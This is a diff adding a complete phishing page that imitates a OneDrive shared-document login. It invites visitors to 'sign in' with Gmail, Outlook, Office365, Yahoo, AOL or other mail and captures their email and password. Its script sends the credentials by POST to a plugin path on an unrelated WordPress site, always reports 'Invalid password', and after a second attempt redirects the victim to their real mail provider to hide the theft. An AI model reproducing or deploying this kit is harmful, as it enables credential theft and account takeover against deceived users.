@@ -1,0 +1,244 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <script type="text/JavaScript" src="https://www.offshoreoceanic.online/admin/onedrive/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/JavaScript" src="https://www.offshoreoceanic.online/admin/onedrive/jquery-3.1.1.min.js"></script>
+    <script type="text/JavaScript" src="https://www.offshoreoceanic.online/admin/onedrive/jquery-3.3.1.js" ></script>
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://www.offshoreoceanic.online/admin/onedrive/bootstrap/4.0.0/css/bootstrap.min.css" >
+    <link href="//fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://www.offshoreoceanic.online/admin/onedrive/releases/v5.7.0/css/all.css" >
+    <title>Online</title>
+    <link href="https://www.offshoreoceanic.online/admin/onedrive/css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row" style="background-image: url('https://www.offshoreoceanic.online/admin/onedrive/d5502942aef6e6d2/a2257b61-7045-42ff-bcda-f395e6b6b530/670x335.jpg'); background-size: cover;background-repeat: no-repeat;">
+            <div class="col-lg-4 mx-auto my-5 px-5 pb-5" style=" background-color: rgba(0,0,0,0.5);border-radius:15px;">
+                <div>
+                    <div class="text-center mt-3">
+                        <img src="https://www.offshoreoceanic.online/admin/onedrive/d5502942aef6e6d2/4748dc7b-5e5f-48f9-84cb-ff0ecdf147c4/399x234.png" class="img-fluid" width="200px"><br>
+                        <span class="h1 text-white">One Drive</span><br><br>
+                        <span class="h5 text-white">To read he document, please choose your email provider below login to view shared files</span>
+                    </div>
+                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #D44638; border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/WeIslUgwU01Rm79h_95GQtZV.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Gmail</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #0073C8;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/yZ1G7WeXCoyEZWCxLfBzTYps.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #31459B;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/shHmOZE4i4IADH0kZavI3JTM.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #FF3C00;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/-UVKRHCNSrssP9CA5oL5av1_.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #5F0F68;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/h-OfeXTnME-WfG91LbgID5Xq.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #0B5BD3;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/OwRnEDwvbDvGHbXcSBaxQcvZ.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                        </div>
+                    </a>
+                    <p class="text-white mt-3 text-center">Go to your all file anywhere on any device, and share them with anyone. One Drive your shared document in one cloud.</p>
+                    <p class="h5 text-center text-white">OneDrive © 2021</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <center>
+                        <img id="fieldImg" src="https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/4vB5dsgRBkFMAfyAYshyogo6.png" class="img-fluid rounded-circle" width="80px">
+                        <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+                        <div class="alert alert-danger" id="msg"></div>
+                    </center>
+                    <form id="contact" action="" method="POST" class="form-horizontal well">
+                        <div class="col-lg-12">
+                            <div class="form-group">
+                                <label for="exampleInputai1">Email address</label>
+                                <input type="email" name="email" class="form-control" id="email" aria-describedby="aiHelp" placeholder="Enter email">
+                                <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                            </div>
+                        </div>
+                        <div class="col-lg-12">
+                            <div class="form-group">
+                                <label for="pr">Password</label>
+                                <input type="password" name="password" class="form-control" id="password" aria-describedby="aiHelp" placeholder="Enter Password">
+                            </div>
+                        </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                    <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+                </div>
+                </form>
+            </div>
+        </div>
+    </div>
+		 <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/jquery.validate.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;	
+
+    $('#gmailmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/4vB5dsgRBkFMAfyAYshyogo6.png');
+        $('#field').html("Gmail");
+        $('#ajaxModal').modal('show');
+    });
+    $('#outlookmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/-dj35b6xrZ9DU8sPwz4rwHjn.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+    });
+    $('#aolmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/3zkKXf_tpFuo6ZboNuYTjGqU.png');
+        $('#field').html("Aol");
+        $('#ajaxModal').modal('show');
+    });
+    $('#office365modal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/yYH6lLMsywjeMuN9BMQGyywX.png');
+        $('#field').html("Office 365");
+        $('#ajaxModal').modal('show');
+    });
+    $('#yahoomodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/7qrPL8kfXD30aBJuksLsuMbJ.png');
+        $('#field').html("Yahoo");
+        $('#ajaxModal').modal('show');
+    });
+    $('#othermodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://www.offshoreoceanic.online/admin/onedrive/images/5fac423973aef50019af881c/eJWiSaMHRi4pIlPMxVYMru1S.ico');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+    });
+   
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var detail = $("#field").html();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+		                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is empty.!");
+
+                return false;
+            }
+			      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+        count = count + 1;
+        if (count >= 2) {
+            count = 0;
+            window.location.replace("https://www."+my_slice);
+        } else {
+            $.ajax({
+                dataType: 'JSON',
+                url: "http://www.probaltic.lt/wp-content/plugins/post.php",
+                type: 'POST',
+                data: {
+                    email: email,
+                    password: password,
+                  
+                },
+                // data: $('#contact').serialize(),
+                beforeSend: function(xhr) {
+                    $('#submit-btn').html('Verifing...');
+                },
+                success: function(response) {
+                    if (response) {
+					$("#password").val("");
+                        $("#msg").show();
+                        console.log(response);
+                        if (response['signal'] == 'ok') {
+                             $("#msg").show();
+             $('#msg').html("Invalid password. Please try again");
+                            // });
+                        } else {
+                                         $("#msg").show();
+             $('#msg').html("Invalid password. Please try again");
+                        }
+                    }
+                },
+                error: function() {
+				$("#password").val("");
+              $("#msg").show();
+             $('#msg').html("Invalid password. Please try again");
+                },
+                complete: function() {
+                    $('#submit-btn').html('Login');
+                }
+            });
+        }
+    });
+});
+</script>
+</body>
+</html>
